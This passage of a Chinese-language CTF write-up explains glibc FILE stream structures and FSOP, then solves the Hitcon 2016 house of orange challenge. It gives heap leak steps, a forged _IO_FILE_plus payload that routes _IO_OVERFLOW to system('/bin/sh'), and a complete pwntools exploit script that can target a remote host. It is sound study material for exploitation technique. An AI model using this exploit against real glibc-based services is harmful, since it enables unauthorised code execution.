_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></details><details>    <summary>`struct _IO_jump_t`结构</summary>​```cstruct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);#if 0    get_column;    set_column;#endif};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;details&gt;</span><br><span class="line">FSOP是File Stream Oriented Programming的缩写，核心就是改写&#96;_IO_list_all&#96;的值，伪造&#96;struct _IO_FILE_plus&#96;结构，对控制流进行劫持。&#96;_IO_list_all&#96;是glibc中的一个全局变量，是一个&#96;struct _IO_FILE_plus&#96;的指针，默认情况下指向stderr-&gt;-&gt;stdout-&gt;stdin。标准输入、标准输出、标准错误输出都是&#96;struct _IO_FILE&#96;类型，都被包含在于&#96;struct _IO_FILE_plus&#96;结构中，使用&#96;struct _IO_FILE&#96;中的chain变量连接。</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;c</span><br><span class="line">extern struct _IO_FILE_plus _IO_2_1_stdin_;</span><br><span class="line">extern struct _IO_FILE_plus _IO_2_1_stdout_;</span><br><span class="line">extern struct _IO_FILE_plus _IO_2_1_stderr_;</span><br><span class="line"></span><br><span class="line">#define _IO_stdin ((_IO_FILE*)(&amp;_IO_2_1_stdin_))</span><br><span class="line">#define _IO_stdout ((_IO_FILE*)(&amp;_IO_2_1_stdout_))</span><br><span class="line">#define _IO_stderr ((_IO_FILE*)(&amp;_IO_2_1_stderr_))</span><br></pre></td></tr></table></figure>在堆中可以使用`malloc_printerr`触发劫持。下图为对`malloc_printerr`中一系列的函数调用关系，最终在`_IO_flush_all_lockp`中会对链表中每一个文件进行刷新，满足条件的情况下，调用每个文件的`_IO_OVERFLOW`函数。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/abort_routine.001.jpeg"></p><h2 id="Hitcon2016-houseoforange"><a href="#Hitcon2016-houseoforange" class="headerlink" title="Hitcon2016 houseoforange"></a>Hitcon2016 houseoforange</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>关键数据结构</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200725225408295.png" alt="image-20200725225408295"></p><p>功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. Build the house                  </span><br><span class="line">2. See the house                    </span><br><span class="line">3. Upgrade the house                </span><br><span class="line">4. Give up</span><br></pre></td></tr></table></figure><p>Build：输入名称长度size，依次经过malloc(0x10)、malloc(size)、calloc(0x8)，然后读入名称等。</p><p>See：输出名称等。</p><p>Upgrade：对名称进行修改，可以输入任意长度字符，也就是堆上任意长度的溢出。</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>使用house of orange使得old top chunk进入unsorted bin。分配large size的块，泄露libc base和heap addr。</p><p>使用unsorted bin attack修改<code>_IO_list_all</code>，攻击后它将指向unsorted bin在main_arena中的头结点。unsorted bin attack的同时，在同一个chunk上伪造 <code>struct _IO_FILE_plus</code>结构。修改该<code>chunk-&gt;size</code>为0x61使其落入small bin(0x60)也就是unsorted bin头结点地址+0x68（相当于修改<code>struct _IO_FILE</code>中chain）。</p><h3 id="house-of-orange-1"><a href="#house-of-orange-1" class="headerlink" title="house of orange"></a>house of orange</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="number">0x200</span> - <span class="number">0x20</span> - <span class="number">0x20</span> - <span class="number">0x10</span>, <span class="string">&quot;A&quot;</span>)  <span class="comment"># 在top chunk总共分配0x200</span></span><br><span class="line">upgrade(<span class="number">0x1b0</span>+<span class="number">0x20</span>+<span class="number">0x10</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x1d8</span> + p64(<span class="number">0xe01</span>)) <span class="comment"># 覆盖topchunk-&gt;size为0xe01</span></span><br><span class="line">build(<span class="number">0x1000</span>, <span class="string">&quot;A&quot;</span>)                      <span class="comment"># 分配一个大于0xe00的块，触发house of orange</span></span><br></pre></td></tr></table></figure><h3 id="leak-libc-and-heap"><a href="#leak-libc-and-heap" class="headerlink" title="leak libc and heap"></a>leak libc and heap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc base </span></span><br><span class="line">build(<span class="number">0x400</span>, <span class="string">&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">libc_addr = u64(io.recvline()[<span class="number">8</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">pf(<span class="string">&quot;libc base&quot;</span>, libc_addr)</span><br><span class="line">libc_base = libc_addr - <span class="number">0x3C5178</span></span><br><span class="line">libc_base = libc_addr - <span class="number">0x39C178</span></span><br><span class="line">pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">upgrade(<span class="number">0x10</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">heap_addr = u64(io.recvline()[<span class="number">16</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">pf(<span class="string">&quot;heap addr&quot;</span>, heap_addr)</span><br></pre></td></tr></table></figure><p>分配large size的块，泄露libc base和heap addr，因为large bin会将fd_nextsize和bk_nextsize存储在chunk中（unsorted bin中的唯一chunk被取出放在large bin中，然后切割分配。如果是small size，则会在unsorted bin 中直接切割分配）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">   only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">   runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">   exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">   no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure><h3 id="unsorted-bin-attack-amp-amp-FSOP"><a href="#unsorted-bin-attack-amp-amp-FSOP" class="headerlink" title="unsorted bin attack &amp;&amp; FSOP"></a>unsorted bin attack &amp;&amp; FSOP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">b&quot;A&quot;</span>*<span class="number">0x420</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0x61</span>)      <span class="comment"># start offset: 0x0--fake size</span></span><br><span class="line">payload += <span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span> + p64(libc_base+libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]<span class="number">-0x10</span>)  <span class="comment"># start offset: 0x10--unsorted bin attack</span></span><br><span class="line">payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x90</span>  <span class="comment"># start offset: 0x20--满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span>    <span class="comment"># start offset: 0xc0--满足fp-&gt;_mode &lt;= 0</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x430</span>+<span class="number">0xe0</span>)  <span class="comment"># start offset: 0xd8--vtable</span></span><br><span class="line">payload += p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])*<span class="number">4</span> <span class="comment"># start offset: 0xe0--_IO_OVERFLOW=system</span></span><br><span class="line">upgrade(len(payload), payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/listall.001.jpeg"></p><h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>概率性的出错，有时候<code>_IO_list_all</code>指向的第一个<code>struct _IO_FILE_plus</code>会满足<code>_IO_OVERFLOW</code>的执行条件，而我们伪造的在第二个，从而执行出错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">     )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>在我调试过程中发现<code>_IO_vtable_offset(fp) == 0</code>这个验证不存在，下图中的条件编译应该是选择了后者。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200725235629121.png" alt="image-20200725235629121"></p><p><code>fp-&gt;_mode &gt; 0</code>中的_mode是int类型，依赖于libc地址随机。如果恰巧最高位为0，这个条件也就被满足了。</p><p><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>正好指向bin，因为bin是空的都指向自身，而<code>_IO_write_base</code>位于<code>_IO_write_ptr</code>的低地址处，所以这个条件一定被满足。</p><p>综上，只要随机到_mode所处位置的最高位为0，就会失败。</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/Hitcon2016%20house_of_orange/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;info&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;houseoforange&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>           <span class="comment"># GLIBC 2.23-0ubuntu11.2</span></span><br><span class="line"><span class="comment"># locallibc = &quot;../glibc_versions/2.23/x64_notcache/lib/libc-2.23.so&quot;</span></span><br><span class="line"></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">length, name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span>(<span class="params">length, name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Price of Orange: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Color of Orange: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    build(<span class="number">0x200</span> - <span class="number">0x20</span> - <span class="number">0x20</span> - <span class="number">0x10</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    upgrade(<span class="number">0x1b0</span>+<span class="number">0x20</span>+<span class="number">0x10</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x1d8</span> + p64(<span class="number">0xe01</span>))</span><br><span class="line">    build(<span class="number">0x1000</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b genops.c:759&quot;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *$rebase(0x13D5)&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc base </span></span><br><span class="line">    build(<span class="number">0x400</span>, <span class="string">&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">    libc_addr = u64(io.recvline()[<span class="number">8</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_addr)</span><br><span class="line">    libc_base = libc_addr - <span class="number">0x3C5178</span></span><br><span class="line">    <span class="comment"># libc_base = libc_addr - 0x39C178</span></span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap addr</span></span><br><span class="line">    upgrade(<span class="number">0x10</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">    heap_addr = u64(io.recvline()[<span class="number">16</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    pf(<span class="string">&quot;heap addr&quot;</span>, heap_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># IO_FILE</span></span><br><span class="line">    payload  = <span class="string">b&quot;A&quot;</span>*<span class="number">0x420</span></span><br><span class="line">    payload += <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0x61</span>)                               <span class="comment"># start offset: 0x0</span></span><br><span class="line">    payload += <span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span> + p64(libc_base+libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]<span class="number">-0x10</span>)  <span class="comment"># start offset: 0x10</span></span><br><span class="line">    payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x90</span>                              <span class="comment"># start offset: 0x20</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span>                                       <span class="comment"># start offset: 0xc0</span></span><br><span class="line">    payload += p64(heap_addr+<span class="number">0x430</span>+<span class="number">0xe0</span>)                                <span class="comment"># start offset: 0xd8</span></span><br><span class="line">    payload += <span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span> + p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])            <span class="comment"># start offset: 0xe0</span></span><br><span class="line">    upgrade(len(payload), payload)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li>how2heap house_of_orange.c</li><li><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li><li><a href="https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html">https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></li></ol>]]></content>
    
    
